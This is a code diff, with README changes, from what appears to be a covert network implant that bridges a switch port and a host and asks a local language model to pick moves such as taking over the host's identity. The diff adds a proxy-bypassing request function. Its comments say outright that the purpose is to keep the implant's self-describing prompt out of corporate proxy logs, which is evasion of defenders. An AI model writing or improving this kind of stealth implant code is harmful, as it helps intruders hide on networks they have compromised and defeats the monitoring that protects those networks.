@@ -12,11 +12,23 @@ over PoE -- watts, seconds, thermal headroom -- is not measured anywhere
 in this repository and cannot be, because there is no device. The first
 operator to switch it on is the first measurement.
 
-**Loopback only, checked twice.** `read_way_out_policy` refuses a
-non-loopback endpoint in the beacon's process; this refuses one again in
-the scout's. The model exists for this implant's own decision, and a
-listener reachable from the target segment would hand it to anyone on the
-network the implant is hiding in.
+**Loopback only, and the third check is the one that counts.**
+`read_way_out_policy` refuses a non-loopback endpoint in the beacon's
+process and `_is_loopback` refuses one again here -- but both of those
+read the endpoint's *text*, and neither constrains the socket. The
+request went out through `urllib.request.urlopen`, which builds its
+opener from `getproxies()`: with `http_proxy` set in the implant's
+environment and no `no_proxy`, the whole prompt was POSTed in cleartext
+to that proxy. That prompt is a confession -- it says there is an
+implant, that it bridges a switch port and a host, how long it has been
+dark, the host's MAC, IP, proxy and resolver, and the menu of moves
+including taking the host's identity -- and a corporate proxy is the one
+device on the network most certain to log it. So `_open` below carries an
+empty `ProxyHandler`, which is the same reason and the same fix
+`beacon.py`'s `_HttpSession` already has for `trust_env`. The model
+exists for this implant's own decision, and a listener reachable from
+the target segment would hand it to anyone on the network the implant is
+hiding in.
 
 **A bad answer is a refusal, logged, not a crash.** The stance
 `read_egress_policy` takes toward a rule that could never fire, for the
@@ -130,9 +142,7 @@ def ask(model: dict, state: dict, tap: dict) -> Optional[dict]:
         endpoint.rstrip("/") + "/api/generate", data=body, method="POST",
         headers={"Content-Type": "application/json"})
     try:
-        with urllib.request.urlopen(
-                request, timeout=model.get("timeout_seconds", 120)) as reply:
-            raw = reply.read()
+        raw = _open(request, model.get("timeout_seconds", 120))
     except Exception as exc:
         # Every failure is the same failure here: nothing to publish, and
         # the beacon decides on its policy. One line, because this is once
@@ -214,6 +224,26 @@ def _prompt(state: dict, tap: dict) -> str:
         tap=json.dumps(tap or {}, sort_keys=True),
         verbs="\n".join("  %s -- %s" % (verb, _VERB_NOTES.get(verb, ""))
                         for verb in ALLOWED))
+
+
+def _open(request, timeout) -> bytes:
+    """Make the one request, and never through a proxy.
+
+    `urllib.request.urlopen` builds its opener from `getproxies()`, so
+    this call used to honour `http_proxy` from the implant's environment
+    -- and send the prompt, which describes the implant and the host it
+    is tapping, to a corporate proxy. An empty `ProxyHandler` is what
+    stops `build_opener` installing the default one; it is the same fix
+    `_HttpSession.trust_env` is for in `beacon.py`.
+
+    The seam a test stands in for is **here** rather than at `urlopen`,
+    because a test that patched `urlopen` was patching the defect: the
+    only honest pin on "it does not leave this host" is a listener, and
+    `test_scout_model.py` has one.
+    """
+    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+    with opener.open(request, timeout=timeout) as reply:
+        return reply.read()
 
 
 def _is_loopback(endpoint: str) -> bool:
